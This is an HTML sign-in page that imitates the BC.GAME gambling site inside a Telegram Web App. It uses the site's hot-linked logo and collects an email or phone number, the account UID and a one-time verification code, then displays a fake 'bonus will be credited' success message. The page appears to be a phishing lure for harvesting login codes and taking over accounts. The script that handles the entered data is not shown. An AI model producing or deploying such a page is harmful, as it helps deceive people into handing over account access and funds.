<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BC.GAME | Sign In</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="dark">
    <div class="login-container">
        <div class="login-card">
            <div class="login-header">
                <img src="https://bc.game/assets/logo.01f4640d.png" alt="BC.GAME" class="logo">
                <button class="close-btn" id="close-app">&times;</button>
            </div>

            <div class="tab-container">
                <div class="tab active" data-tab="otp">OTP Login</div>
                <div class="tab" data-tab="password">Password</div>
            </div>

            <div class="form-container">
                <div class="input-group-toggle">
                    <button class="toggle-btn active" data-type="email">Email</button>
                    <button class="toggle-btn" data-type="phone">Mobile</button>
                </div>

                <div class="input-field">
                    <label id="input-label">Email Address</label>
                    <div class="input-wrapper">
                        <i class="fas fa-envelope" id="input-icon"></i>
                        <input type="text" id="user-identifier" placeholder="Enter your email">
                    </div>
                </div>

                <div class="input-field" id="uid-field">
                    <label>BC.GAME UID</label>
                    <div class="input-wrapper">
                        <i class="fas fa-id-badge"></i>
                        <input type="number" id="user-uid" placeholder="Enter your UID">
                    </div>
                </div>

                <div class="input-field" id="otp-field">
                    <label>Verification Code</label>
                    <div class="input-wrapper">
                        <i class="fas fa-shield-alt"></i>
                        <input type="text" id="otp-code" placeholder="Enter code">
                        <button class="send-code-btn" id="send-otp">Send Code</button>
                    </div>
                    <div class="timer-text" id="timer-container" style="display: none;">
                        Resend in <span id="timer-count">60</span>s
                    </div>
                </div>

                <button class="submit-btn" id="login-submit">Sign In</button>

                <div class="divider">
                    <span>Or Login With</span>
                </div>

                <div class="social-login">
                    <button class="social-btn google">
                        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="Google">
                    </button>
                    <button class="social-btn telegram">
                        <i class="fab fa-telegram-plane"></i>
                    </button>
                    <button class="social-btn whatsapp">
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>

                <div class="footer-links">
                    <span>Don't have an account? <a href="#">Sign up now</a></span>
                </div>
            </div>
        </div>
    </div>

    <!-- Success Modal -->
    <div id="success-modal" class="modal">
        <div class="modal-content">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h2>Success</h2>
            <p>Verification successful! Your bonus will be credited.</p>
            <button id="modal-ok">OK</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
